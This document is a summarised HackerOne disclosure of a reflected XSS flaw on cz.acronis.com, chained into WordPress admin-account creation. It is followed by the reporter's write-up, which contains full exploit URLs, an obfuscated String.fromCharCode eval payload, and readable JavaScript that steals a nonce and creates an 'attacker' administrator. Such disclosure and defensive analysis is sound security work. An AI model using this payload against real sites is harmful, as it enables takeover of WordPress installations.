# Reflected XSS on cz.acronis.com with WordPress Admin User Creation

## Metadata
- **Source:** HackerOne
- **Report:** 935503 | https://hackerone.com/reports/935503
- **Submitted:** 2020-07-22
- **Reporter:** cabelo
- **Program:** Acronis
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Reflected Cross-Site Scripting (XSS), Privilege Escalation, Improper Input Validation, Unencoded Output
- **CVEs:** None
- **Category:** web-api

## Summary
A reflected XSS vulnerability exists in the 'email' parameter of a newsletter signup page on cz.acronis.com. When an authenticated WordPress admin user visits a malicious link, the injected JavaScript can be executed to automatically create a new administrator account, effectively allowing attackers to gain administrative access to the WordPress installation.

## Attack scenario
1. Attacker discovers the reflected XSS vulnerability in the email parameter by testing URL encoding bypass techniques
2. Attacker crafts a payload using HTML entity encoding (%3C, %3E) to bypass basic XSS filters and inject arbitrary JavaScript
3. Attacker encodes a complex JavaScript payload using String.fromCharCode() to obfuscate the code and further evade detection
4. Attacker sends the malicious URL to a WordPress administrator via phishing or social engineering
5. When the admin clicks the link while authenticated, the injected script executes in their browser context
6. The JavaScript extracts WordPress nonce tokens, performs XMLHttpRequest calls to /wp-admin/user-new.php, and creates a new admin user account with attacker-controlled credentials

## Root cause
The application fails to properly sanitize and encode user input from the 'email' parameter before reflecting it in the HTML response. The filtering mechanism does not account for encoded payloads using HTML entities and character encoding techniques, allowing attackers to bypass XSS protections.

## Attacker mindset
The attacker demonstrates sophisticated understanding of WordPress architecture, CSRF token extraction, and multi-layer bypass techniques. By using String.fromCharCode() encoding, they evade signature-based filters. The goal is complete account takeover through privilege escalation, leveraging the XSS as a stepping stone for persistent administrative access.

## Defensive takeaways
- Implement strict input validation on the email parameter using whitelist validation for email format
- Apply context-appropriate output encoding (HTML entity encoding) to all reflected user input before rendering in HTML context
- Use Content Security Policy (CSP) headers to prevent inline script execution and restrict script sources
- Implement server-side XSS filters that decode multiple layers of encoding before validation
- Enforce CSRF token validation on all state-changing WordPress admin operations
- Apply WAF rules to detect and block JavaScript payloads, including encoded variants
- Require re-authentication for sensitive operations like user creation even if admin is logged in
- Implement security headers like X-XSS-Protection and X-Content-Type-Options

## Variant hunting
Test other query parameters (user, oktosend) for reflected XSS with similar encoding bypasses
Search for other Acronis subdomains with newsletter signup forms using similar parameter names
Test double URL encoding (%252f, %252e) to bypass single-layer decoding filters
Attempt Unicode and UTF-8 encoding variants of payload characters
Investigate if other string character encoding methods (fromCharCode, charCodeAt chains) bypass filters
Check for stored XSS in email field if data is cached or logged anywhere
Test browser-specific XSS vectors (SVG, event handlers) with encoding bypasses
Examine if JSONP endpoints or API responses reflect the email parameter unsafely

## MITRE ATT&CK
- T1190
- T1566.002
- T1200
- T1059.007
- T1078.001
- T1098.001

## Notes
This report references a previous finding (901014) suggesting a pattern of similar vulnerabilities across Acronis properties. The vulnerability is particularly severe because it chains XSS with WordPress admin privilege escalation, creating a complete account takeover path. The use of obfuscated JavaScript via character encoding is a known evasion technique that should trigger enhanced filtering rules. The prerequisite that an admin must be logged in limits exposure but does not eliminate risk for targeted attacks against administrators.

## Full report
<details><summary>Expand</summary>

Hi team,

There is a  Reflected XSS on https://cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director/

This attack uses the same technique as my other report  [901014](https://hackerone.com/reports/901014) for creating an administrator user in Wordpress with an  new XSS vulnerability in website.

Pre-requisite: User must be logged in to the WordPress in as an admin.

Parameter vulnerable: email=

Payload used:

email@teste.com<%2fscript><script>alert(1)<%2fscript>qw87f
email@teste.com%3C%2fscript%3E%3Cscript%3Eeval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,115,105,116,101,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))%3C%2fscript%3Eg8s3p

XSS URL Test:

https://cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director/?user=OK&oktosend=&email=tester@gmail.comaxsar%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3eqw87f

XSS URL for creating admin user in WordPress:

https://cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director/?user=OK&oktosend=&email=email@teste.com%3C%2fscript%3E%3Cscript%3Eeval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,115,105,116,101,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))%3C%2fscript%3Eg8s3p

Javascript code used to create admin user in WordPress:
```
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params); 
```

Eval encoded Javascript for execution with XSS, payload:
```
eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,115,105,116,101,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))
```

Testing the payload on the browser and inspecting the traffic, we can verify the request to user-new.php, proving that if the user is logged in WordPress
the payload would be executed and a new admin (controlled by the attacker) user created:

{F917829}


</details>

---
*Analysed by Claude on 2026-05-24*
